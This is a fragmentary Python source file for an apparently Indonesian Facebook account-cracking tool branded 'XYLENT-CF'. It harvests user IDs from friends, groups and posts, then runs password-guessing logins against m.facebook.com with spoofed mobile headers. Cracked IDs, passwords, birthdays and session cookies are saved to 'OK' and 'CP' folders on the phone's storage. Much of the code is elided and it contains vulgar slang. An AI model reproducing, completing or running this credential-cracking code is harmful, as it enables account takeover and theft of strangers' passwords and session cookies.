...
def banner():
	clear()
	wel='# BOMBER FACEBOOK TOOLS'
	cik2=mark(wel ,style='red')
	sol().print(cik2)


	ban='''WELLCOME XYLENT-CF
...
───╚══╝ '''
	...
	cetak(nel(oi, title='[bold red] • HALLO GANZ • [/bold red]'))
# VALIDASI TOKEN
def login():
...
#		uaku()
		...
		try:
			...
			try:
				...
				banner()
				li = '# PROBLEM INTERNET CONNECTION, NGENTOD'
...
def menu(my_name,my_id):
	...
	io = '''[bold green][01] DUMP ID TARGET	    
[02] DUMP ID MASAL   
[03] DUMP ID FOLLOW		     
[04] DUMP ID POST	     
[05] DUMP ID GRUP 
...
def result():
	...
	kayes = '[bold cyan][01] OPEN CP\n[02] OPEN OK\n[00] MENU UTAMA[/bold cyan]'
	kis = nel(kayes, style='cyan')
	cetak(nel(kis, title='RESULTS'))
	kz = input(x+'['+p+'f'+x+'] Choose : ')
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/CF-DATA/CP')
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/CF-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/CF-DATA/CP/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, EROR JON'
		...
		try:vin = os.listdir('/sdcard/CF-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/CF-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/CF-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, EROR JON'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/CF-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/CF-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/CF-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def dumpdump(pil):
	try:
		...
		li = '# PROBLEM INTERNET CONNECTION,EROR JON'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		input('')
...
def dump_massal():
	...
	if pilih in ['1','01']:
		...
		print(x+'['+h+'•'+x+'] ENTER MAX ID LIMIT [20]')
		try:
...
def dump_grup():
	...
	try:
		...
		au = '# PROBLEM INTERNET CONNECTION, EROR JON'
...
def crack_file():
	...
	sol().print(mark(cek, style='green'))
	try:vin = os.listdir('/sdcard/CF-DATA/DUMP')
	except FileNotFoundError:
		gada = '# STORAGE NOT FOUND '
		sol().print(mark(gada, style='red'))
		time.sleep(2)
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/CF-DATA/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
			...
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/CF-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE NOT FOUND, EROR JON'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
...
def setting():
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	guw = '# MENAMPILKAN APK TERKAIT ? (y/t)'
	...
	if cpres in ['y','Y']:
		...
		princp.append('no')
	guw = '# MENAMBAHKAN SANDI MANUAL ? (y/t)'
	sol().print(mark(guw, style='yellow'))
...
# WORDLIST
def passwrd():
	ler = '# PROCCESS MALING, PRESS CTRL+Z TO STOP'
	sol().print(mark(ler, style='green'))
	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/CF-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/CF-DATA/CP/%s\nON OF MODE DATA 500 ID'%(okc,cpc)
...
#	ua='Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36'
	...
	sys.stdout.write('\r%s 🔥 %s/%s [ NGOPI:%s - TURU:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
...
#tapyes			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','cache-control': 'max-age=0','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin%26refsrc%3Ddeprecated%26ref%3Ddbl&flow=login_no_pin&refsrc=deprecated&ref=dbl&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					try:
						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}\n[•] BIRTHDAY : {ttl}'
						open('/sdcard/CF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
					except:
						statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}'
						open('/sdcard/CF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					statuscp1 = nel(statuscp, style='blue')
					cetak(nel(statuscp1, title='XYLENT TURU'))
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/CF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='XYLENT NGOPI'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]XYLENT NGOPI[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in req.cookies.get_dict().keys():
				try:
					...
					if opsinya=='':
						try:
							open('/sdcard/CF-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
						except:
							open('/sdcard/CF-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
					else:
						try:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] BIRTHDAY : {ttl}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
							open('/sdcard/CF-DATA/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
						except:
							statusok = f'\r[•] ID       : {id}\n[•] PASSWORD : {pw}\n[•] CHECKPOINT OPTION   :\n {opsinya}'
							open('/sdcard/CF-DATA/CP/'+cpc,'a').write(id+'|'+pw+'\n')
				...
				statusok1 = nel(statusok, style='yellow')
				cetak(nel(statusok1, title='CHECKPOINT OPTION'))
				open('/sdcard/CF-DATA/OK/'+okc,'a').write(id+'|'+pw+'\n')
			...
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, EROR JON'
			sol().print(mark(li, style='red'))
			exit()
if __name__=='__main__':
	try:os.mkdir('/sdcard/CF-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/CFDATA/OK')
	except:pass
	try:os.mkdir('/sdcard/CF-DATA/DUMP')
	except:pass
	login()
